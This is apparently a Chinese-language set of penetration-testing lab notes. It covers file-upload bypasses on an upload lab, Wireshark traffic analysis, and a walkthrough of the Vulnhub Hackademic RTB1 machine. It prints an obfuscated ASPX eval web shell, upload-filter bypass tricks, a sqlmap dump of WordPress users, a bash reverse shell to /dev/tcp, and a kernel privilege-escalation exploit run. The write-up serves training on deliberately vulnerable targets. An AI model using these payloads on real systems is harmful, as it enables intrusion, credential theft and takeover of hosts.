---
title: 上传文件与流量分析
---

# 上传文件与流量分析

​      January 10, 2024            1573    

## attack虚拟机攻击vul靶机

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)端口

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)扫端口

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)目标端口输入地址下载文件

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)连接sqlserver获取端口密码

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)截取32位，命名文件并修改后缀，上传

12345678.aspx.JPG文件：

<%@PAGE LANGUAGE=JSCRIPT%>
<%var PAY:String=
Request[“\x61\x62\x63\x64”];eval
(PAY,”\x75\x6E\x73\x61”+
“\x66\x65”);%>

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)蚁剑连接数据库取得key2

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)同时获得数据库密码

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)获得key3

## 上传文件

upload靶场

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)上传文件获取地址

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)爆破设置

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)添加前缀为上传文件名，还有hash

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)爆破结果

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)结果

win10系统会忽略后缀的.和空格，liunx不会

在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持::$DATA之前的文件名，他的目的就是不检查后缀名

例如:”phpinfo.php::$DATA”Windows会自动去掉末尾的::$DATA变成”phpinfo.php”

12关在抓包后修改存储路径cmd.php%00(%00是丢弃后面的)(复制图像链接后需要删除后面的内容)

13关抓包后修改路径为cmd.php加空格，在hex十六进制中修改这个空格的20为00

14关Jpg格式图片的文件头标识：FFD8开头FFD9结尾
Png格式图片的文件头标识：89 20 4E 47 0D 0A
Gif格式图片的文件头标识：GIF89a GIF87a

copy 123.jpg/b+cmd1.php new.jpg

## 流量分析

wireshark补充内容

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)过滤。目的ip，发送ip，http协议

抓包分析

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)url解码

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)base64解码

## 0.2 vulnhub-Hackademic RTB1靶机

https://www.yuque.com/sunwu-pbywz/baji/unuvgx

靶场下载地址：https://www.vulnhub.com/entry/hackademic-rtb1,17/

arp-scan -l

![根据靶机mac地址查找IP（arp-scan -L）](../img/根据靶机mac地址查找IP（arp-scan -L）.png)

dirsearch -u http://192.168.2.59/Hackademic_RTB1/ -x 403

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)sql注入找回显

1. sqlmap -u http://192.168.2.59/Hackademic_RTB1/?cat=1 –dbms=mysql –batch -D wordpress -T wp_users –dump

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)爆库

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)爆表

bash -i >& /dev/tcp/192.168.2.59/4444 0>&1

nc lvvp 4444

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)shell

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)蚁剑传输

python -c ‘import pty; pty.spawn(“/bin/bash”)’

searchsploit  2.6.3|grep Local

locate 15285.c

cp /usr/share/exploitdb/exploits/linux/local/15285.c ./

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)复制15285.c

cd /tmp

gcc -o exp 15285.c

chmod 777 exp

./exp

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)提权

cat /root/key.txt

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)key